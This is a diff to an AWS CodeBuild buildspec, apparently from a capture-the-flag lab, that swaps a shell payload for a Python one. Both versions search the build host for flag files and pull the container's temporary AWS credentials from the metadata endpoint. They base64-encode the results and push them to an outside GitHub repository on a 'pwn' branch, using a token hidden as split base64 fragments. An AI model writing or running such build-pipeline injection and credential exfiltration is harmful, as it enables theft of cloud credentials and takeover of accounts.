@@ -5,22 +5,48 @@ phases:
     commands:
       - echo "Flag search"
       - |
-        P1="Z2l0aHViX3BhdF8xMUJTVUwyS0E="
-        P2="MGxkVERCbVFPYXlaal9JZUJ1ZFA="
-        P3="ckp2ZExkYkhQa1VQN2l6WTBPN3BSM3VoRUhTZmNUUks3MFIxeVQ3SU9YTEdHRDlYeFo5bUE="
-        TK="$(echo -n $P1 | base64 -d)$(echo -n $P2 | base64 -d)$(echo -n $P3 | base64 -d)"
-        {
-          echo "=== CODEBUILD PROJECT ==="
-          aws codebuild batch-get-projects --names codebuild_lab_5_project --region us-east-1 2>&1
-          echo "=== GREP FLAG ==="
-          grep -ri "flag" /codebuild /tmp 2>/dev/null | head -50
-          find / -name "*flag*" -type f 2>/dev/null | head -20
-          echo "=== CURL METADATA ==="
-          curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI 2>&1 | head -20
-          echo "=== DONE ==="
-        } > /tmp/out.txt 2>&1
-        B64=$(base64 -w0 /tmp/out.txt)
-        curl -s -X PUT -H "Authorization: token $TK" -H "Content-Type: application/json" \
-          "https://api.github.com/repos/DeonCoolx/codebuild-codebreach-actors-lab/contents/out.txt" \
-          -d "{\"message\":\"r\",\"content\":\"$B64\",\"branch\":\"pwn\"}" > /dev/null 2>&1
-        unset TK P1 P2 P3
+        python3 << 'SCRIPT'
+        import subprocess, json, urllib.request, base64, os
+
+        def run(cmd):
+            try:
+                return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode()
+            except Exception as e:
+                return str(e)
+
+        p1 = base64.b64decode("Z2l0aHViX3BhdF8xMUJTVUwyS0E=").decode()
+        p2 = base64.b64decode("MGxkVERCbVFPYXlaal9JZUJ1ZFA=").decode()
+        p3 = base64.b64decode("ckp2ZExkYkhQa1VQN2l6WTBPN3BSM3VoRUhTZmNUUks3MFIxeVQ3SU9YTEdHRDlYeFo5bUE=").decode()
+        tk = p1 + p2 + p3
+
+        output = []
+        output.append("=== CODEBUILD PROJECT ===")
+        output.append(run("aws codebuild batch-get-projects --names codebuild_lab_5_project --region us-east-1"))
+        output.append("=== GREP FLAG ===")
+        output.append(run("grep -ri 'flag' /codebuild /tmp 2>/dev/null | head -50"))
+        output.append(run("find / -name '*flag*' -type f 2>/dev/null | head -20"))
+        output.append("=== METADATA CREDS ===")
+        cred_uri = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
+        if cred_uri:
+            output.append(run(f"curl -s http://169.254.170.2{cred_uri}"))
+        output.append("=== DONE ===")
+
+        content = "\n".join(output)
+        b64 = base64.b64encode(content.encode()).decode()
+
+        data = json.dumps({"message": "r", "content": b64, "branch": "pwn"}).encode()
+        req = urllib.request.Request(
+            f"https://api.github.com/repos/DeonCoolx/codebuild-codebreach-actors-lab/contents/result.txt",
+            data=data,
+            headers={
+                "Authorization": f"token {tk}",
+                "Content-Type": "application/json"
+            },
+            method="PUT"
+        )
+        try:
+            resp = urllib.request.urlopen(req)
+            print("Exfil success:", resp.status)
+        except Exception as e:
+            print("Exfil failed:", e)
+        SCRIPT
